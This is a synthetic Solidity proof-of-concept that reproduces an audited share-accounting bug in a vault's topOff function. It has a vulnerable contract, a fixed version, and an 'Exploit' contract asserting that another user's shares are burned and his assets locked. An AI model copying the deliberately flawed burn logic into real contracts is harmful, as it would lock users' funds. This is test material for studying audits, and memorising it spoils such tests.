// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Omo OmoVault.topOff — burns agentBalance instead of record.shares
    (Pashov, Omo, 2025-01, C-02).
    SYNTHETIC, cheatcode-free. The two audited lines are verbatim (@> VULN).

    Share price is 2. Alice's redeem is 100 shares / 200 assets. Bob's 100
    shares sit on the vault too. topOff burns 200 shares, so Bob's shares are
    destroyed and his 200 assets stay in the vault. */

contract Asset {
    string public name = "USDC";
    string public symbol = "USDC";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract OmoVault {
    struct Record {
        address user;
        uint256 shares;
        bool open;
    }

    Asset public asset;
    uint256 public _totalAssets;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public escrowed;
    Record public record;

    constructor(Asset asset_) {
        asset = asset_;
    }

    function _mint(address to, uint256 amount) internal {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function _burn(address from, uint256 amount) internal {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }

    function openRedeem(address user, uint256 shares) external {
        _mint(address(this), shares);
        escrowed[user] += shares;
        _totalAssets += shares * 2;
    }

    function priceOf(uint256 shares) public view returns (uint256) {
        return shares * _totalAssets / totalSupply;
    }

    function topOff(address user) external virtual {
        uint256 shares = escrowed[user];
        uint256 agentBalance = priceOf(shares);
        record = Record({user: user, shares: shares, open: true});
        asset.transfer(user, agentBalance);
        _totalAssets -= agentBalance;
        // @> VULN: agentBalance is assets paid out, not the shares that redeem should burn
        _burn(address(this), agentBalance);
        escrowed[user] = 0;
        record.open = false;
    }
}

contract OmoVaultFixed is OmoVault {
    constructor(Asset asset_) OmoVault(asset_) {}

    function topOff(address user) external override {
        uint256 shares = escrowed[user];
        uint256 agentBalance = priceOf(shares);
        record = Record({user: user, shares: shares, open: true});
        asset.transfer(user, agentBalance);
        _totalAssets -= agentBalance;
        _burn(address(this), record.shares);
        escrowed[user] = 0;
        record.open = false;
    }
}

contract Exploit {
    uint256 public constant ALICE_SHARES = 100 ether;
    uint256 public constant BOB_SHARES = 100 ether;
    uint256 public constant ALICE_ASSETS = 200 ether;
    uint256 public constant BOB_ASSETS = 200 ether;

    Asset public asset; // nonce 1
    OmoVault public vault; // nonce 2

    uint256 public aliceGot;
    uint256 public vaultShares;
    uint256 public vaultAssets;
    uint256 public bobEscrow;
    bool public bobTopOffReverted;

    constructor() {
        asset = new Asset();
        vault = new OmoVault(asset);
    }

    function run() external {
        address alice = address(0xA11CE);
        address bob = address(0xB0B);
        vault.openRedeem(alice, ALICE_SHARES);
        vault.openRedeem(bob, BOB_SHARES);
        asset.mint(address(vault), ALICE_ASSETS + BOB_ASSETS);
        vault.topOff(alice);
        aliceGot = asset.balanceOf(alice);
        vaultShares = vault.balanceOf(address(vault));
        vaultAssets = asset.balanceOf(address(vault));
        bobEscrow = vault.escrowed(bob);
        (bool ok,) = address(vault).call(abi.encodeWithSelector(vault.topOff.selector, bob));
        bobTopOffReverted = !ok;
        require(aliceGot == ALICE_ASSETS, "alice paid");
        require(vaultShares == 0, "bob shares burned");
        require(bobEscrow == BOB_SHARES, "bob still recorded");
        require(vaultAssets == BOB_ASSETS, "200 stuck");
        require(bobTopOffReverted, "bob cannot redeem");
    }
}
